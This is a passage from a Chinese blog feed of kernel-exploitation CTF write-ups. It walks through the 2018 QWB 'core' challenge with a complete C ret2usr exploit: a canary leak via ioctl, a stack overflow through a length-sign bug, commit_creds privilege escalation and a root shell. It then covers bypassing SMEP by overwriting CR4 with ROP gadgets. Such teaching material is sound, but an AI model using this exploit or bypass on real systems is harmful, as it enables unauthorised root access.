class="literal">NULL</span>)&#123;</span><br><span class="line">                loginfo(<span class="string">&quot;dirty success!&quot;</span>);</span><br><span class="line">                x64dump((<span class="type">char</span> *)p,<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>最后就能成功修改了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309162954125.png"
                      class=""
                >
<p>这里这个case是采用内存搜索的方式进行寻找我们与用户空间相同的物理映射，实际上一般的kernel题不会有任意地址读取返回的内存搜索机会。一般而言我们可以直接在用户空间布置大量具有slide性质的rop链，然后靠溢出等漏洞劫持程序执行流返回到rop链。这里虽然说可能改用户态数据不好精确定位到内核中<strong>physmap</strong>的具体位置，但是由于该映射关系的存在，只要我们在内存中填满rop链，就有很高的概率能够执行我们想要的内容。在实际运用中，只要我们知道了内核的基地址，然后就能够直接劫持执行流到<strong>physmap</strong>的较高地址处。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2usr利用手法以及常见保护机制绕过浅析</title>
    <url>/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h2 id="ret2usr利用手法以及常见保护机制绕过浅析"><a href="#ret2usr利用手法以及常见保护机制绕过浅析" class="headerlink" title="ret2usr利用手法以及常见保护机制绕过浅析"></a>ret2usr利用手法以及常见保护机制绕过浅析</h2><h4 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h4><p>在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。</p>
<p>这里仍以<strong>2018 强网杯 - core</strong>为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid /bin/cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 0  -f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>从init文件中我们可以看出<code>/proc/kallsyms</code>中存的符号信息被备份到了<code>/tmp/kallsyms</code>。这样一来<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>使普通用户无法查看确切的内核符号加载地址的措施就形同虚设了。那么之后我们写exp时就能够直接打开<code>/tmp/kallsyms</code>文件进行读取操作。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250228231014411.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117010705905.png"
                      class=""
                >
<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了<strong>/proc/core</strong>，<strong>exit_core</strong>删除了<strong>/proc/core</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117144829081.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117144951857.png"
                      class=""
                >
<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145051360.png"
                      class=""
                >
<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64 个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 将canary 和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145312844.png"
                      class=""
                >
<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145441269.png"
                      class=""
                >
<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145616435.png"
                      class=""
                >
<p>那我们可以首先靠读取<code>/tmp/kallsyms</code>来获取内核符号基址，然后可以直接劫持控制流到用户空间，用户空间则是提前布置调用内核函数的<code>commit_creds(prepare_kernel_cred(null))</code>，然后最后返回用户态执行system(“/bin/sh”)。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc ret2usr.c -static -masm=intel -g -o ret2usr</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getPrivilege</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301112049755.png"
                      class=""
                >
<p>这个exp是参照了ctfwiki上的exp，这时我有个疑问就是为什么即使可以直接执行用户空间的代码，最后还需要<code>swapgs; popfq; ret;</code>以及<code>iretq; ret</code>着陆用户态呢，如果直接返回到system(“/bin/sh”)又会发生什么呢？</p>
<p>这里我们把rop缩短至如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301143500459.png"
                      class=""
                >
<p>然后到我们主程序的spawn_shell中就内核就panic了，第一个call这里也就是getuid这个libc函数的调用。这里即使我们去除掉getuid的判断，system函数调用还是会崩溃。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301144122307.png"
                      class=""
                >
<p>如果<strong>控制了内核态的 RIP</strong>，并且直接让 <code>RIP</code> 指向 <code>system(&quot;/bin/sh&quot;)</code> 这样的 libc 函数，会发生以下情况：</p>
<ol>
<li><strong>system() 仍然在内核态运行</strong><ul>
<li><code>system(&quot;/bin/sh&quot;)</code> 这个函数是用户态的 libc 代码，执行时它会认为自己仍然在 Ring 3（但实际上是 Ring 0）。</li>
<li><strong>因为没有切换回用户态，进程仍然在 Ring 0 执行</strong>，但 libc 代码假设它在用户态，可能会导致非法访问内核地址，或者崩溃。</li>
</ul>
</li>
<li><strong>可能访问非法地址</strong><ul>
<li><code>system()</code> 需要用户态的栈，如果它访问用户态的 <code>RSP</code>，但 <code>RSP</code> 仍然是内核态栈，可能会导致崩溃。</li>
</ul>
</li>
<li><strong>可能执行 <code>syscall</code>，导致未知行为</strong><ul>
<li><code>system()</code> 依赖 <code>execve()</code>，会执行 <code>syscall</code>，但 <strong>在内核态执行 <code>syscall</code> 会导致崩溃</strong>，因为 <code>syscall</code> 只能从用户态触发。</li>
</ul>
</li>
</ol>
<p>所以我们完成提权后还需着陆用户态。</p>
<h4 id="smep保护绕过"><a href="#smep保护绕过" class="headerlink" title="smep保护绕过"></a>smep保护绕过</h4><p>首先我们要了解smep保护开启与否与CR4寄存器的值密切相关。当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301145351542.png"
                      class=""
                >
<p>但是如果我们开启了smep保护，上述exp就不能成功运行了。首先要开启smep，就可以简单的在启动文件里面的<code>-cpu</code>选项中加上一个<code>+smep</code>即可。而且如果想在cpu选项开启smep或smap保护，都需要先明确指定cpu模型。</p>
<p>如上题的start.sh更改如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu qemu64-v1,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>那么我们如果再次进入内核环境并调用我们的ret2usr的exp，内核就会直接panic，主要是因为开启了smep保护。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301113143244.png"
                      class=""
                >
<p>那么我们就可以开始找能够更改cr4寄存器值的gadget，首先肯定是检索cr4，我们关注中间的几个gadget。其中有的<code>push rcx; popfq;</code>这种实际上不用管，相当于把rcx寄存器的值存到e/rflags寄存器中。那么我们可以通过控制rax或rdi来控制cr4。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150149544.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301150749543.png"
                      class=""
                >
<p>比如我找了<code>pop rdi;ret</code>的gadget，然后就能完全控制cr4寄存器的值了。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。从 <code>0x6f0</code> 可以看出它 <strong>启用了以下 CR4 位</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Bit</th>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>7</td>
<td>PGE</td>
<td>启用全局页，提高 TLB 命中率</td>
</tr>
<tr>
<td>9</td>
<td>OSFXSR</td>
<td>启用 <code>FXSAVE/FXRSTOR</code> 指令</td>
</tr>
<tr>
<td>10</td>
<td>OSXMMEXCPT</td>
<td>允许 SSE 异常处理</td>
</tr>
<tr>
<td>5</td>
<td>PAE</td>
<td>启用物理地址扩展</td>
</tr>
<tr>
<td>4</td>
<td>PSE</td>
<td>启用 4MB 大页</td>
</tr>
<tr>
<td>6</td>
<td>MCE</td>
<td>启用机器检查异常</td>
</tr>
</tbody>
</table>
</div>
<p>这些是正常的系统默认启用的 CPU 特性，并不会影响漏洞利用。</p>
<p>rop更改如下，然后就能正常直接走ret2usr：</p>
